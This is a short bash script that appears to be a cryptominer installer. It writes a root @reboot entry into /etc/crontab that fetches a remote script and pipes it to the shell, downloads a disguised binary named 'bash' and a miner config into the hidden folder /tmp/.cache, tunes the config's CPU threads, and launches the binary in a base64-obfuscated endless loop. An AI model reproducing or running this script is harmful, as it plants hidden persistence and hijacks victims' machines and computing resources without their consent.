#!/bin/bash

mode="${1:-0}"
src="https://raw.githubusercontent.com/vjbahkds/cajbdfv/main"
[ -f "/etc/crontab" ] && sed -i "/^@reboot/d;\$a\@reboot root /bin/sh <(wget --no-check-certificate -qO- ${src}/...) >>/dev/null 2>&1 &\n\n\n" /etc/crontab

name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
[ -n "$name" ] || name="NULL"
name="${name}"

cores=`grep 'siblings' /proc/cpuinfo |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
[ -n "$cores" ] && rx="[`seq -s ', ' 0 $((cores - 1))`]" || rx=""

work="/tmp/.cache"; mkdir -p "${work}";
wget --no-check-certificate -qO "${work}/config.json" "${src}/x.json"
wget --no-check-certificate -qO "${work}/bash" "${src}/bash"
chmod -R 777 "${work}"

[ -f "${work}/config.json" ] && [ -n "$name" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${name}\",/g" "${work}/config.json"
[ -f "${work}/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "${work}/config.json"

if [ "$mode" == "0" ]; then
  /bin/sh <(echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY2FjaGUgJiYgbm9odXAgLi9iYXNoID4vZGV2L251bGwgMj4mMSA7IGRvbmU=' |base64 -d) &
else
  /bin/sh <(echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY2FjaGUgJiYgbm9odXAgLi9iYXNoID4vZGV2L251bGwgMj4mMSA7IGRvbmU=' |base64 -d)
fi
